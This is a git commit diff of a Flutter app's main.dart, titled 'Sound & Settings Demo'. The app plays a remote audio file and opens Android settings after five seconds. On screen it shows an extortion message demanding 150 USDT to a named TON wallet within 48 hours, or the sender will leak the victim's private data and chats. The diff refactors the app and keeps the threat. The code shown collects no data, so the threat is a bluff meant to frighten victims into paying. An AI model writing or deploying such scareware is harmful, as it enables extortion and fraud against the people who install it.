2553c6dcaa82fecadda39bbbee0756eb4d49d1d7
alahlymasr9-art <alahlymasr9@gmail.com>
2025-07-24 05:52:18 +0300

    Update main.dart

--- lib/main.dart
+++ lib/main.dart
@@ -1,61 +1,69 @@
 import 'package:flutter/material.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:android_intent_plus/android_intent_plus.dart';
-import 'dart:io';
- 
+import 'dart:async';
+
 void main() {
-  runApp(const MyApp());
+  runApp(MyApp());
 }
 
 class MyApp extends StatelessWidget {
-  const MyApp({super.key});
   @override
   Widget build(BuildContext context) {
-    return const MaterialApp(home: MainPage());
+    return MaterialApp(
+      title: 'Sound & Settings Demo',
+      home: SplashScreen(),
+      debugShowCheckedModeBanner: false,
+    );
   }
 }
 
-class MainPage extends StatefulWidget {
-  const MainPage({super.key});
+class SplashScreen extends StatefulWidget {
   @override
-  State<MainPage> createState() => _MainPageState();
+  _SplashScreenState createState() => _SplashScreenState();
 }
 
-class _MainPageState extends State<MainPage> {
+class _SplashScreenState extends State<SplashScreen> {
   final player = AudioPlayer();
 
   @override
   void initState() {
     super.initState();
-    Future.delayed(const Duration(seconds: 1), () async {
-      await player.play(UrlSource("https://files.catbox.moe/bkz6o8.mp3"));
-      await Future.delayed(const Duration(seconds: 5));
-      if (Platform.isAndroid) {
-        final intent = AndroidIntent(action: 'android.settings.SETTINGS');
-        intent.launch();
-      }
+
+    // شغّل الصوت من الإنترنت
+    player.play(
+      UrlSource('https://files.catbox.moe/bkz6o8.mp3'),
+    );
+
+    // بعد 5 ثوانٍ، افتح الإعدادات
+    Timer(Duration(seconds: 5), () {
+      final intent = AndroidIntent(
+        action: 'android.settings.SETTINGS',
+      );
+      intent.launch();
     });
   }
 
   @override
   Widget build(BuildContext context) {
     return Stack(
-      fit: StackFit.expand,
       children: [
-        Image.network(
-          'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
-          fit: BoxFit.cover,
+        Positioned.fill(
+          child: Image.network(
+            'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
+            fit: BoxFit.cover,
+          ),
         ),
-        const Center(
-child: Text(
-  "Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
-  style: TextStyle(
-    color: Colors.green,
-    fontSize: 12,
-    fontWeight: FontWeight.bold,
-  ),
-)
-
+        Center(
+          child: Text(
+            "Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
+            style: TextStyle(
+              color: Colors.green,
+              fontSize: 12,
+              fontWeight: FontWeight.bold,
+            ),
+          ),
+        ),
       ],
     );
   }
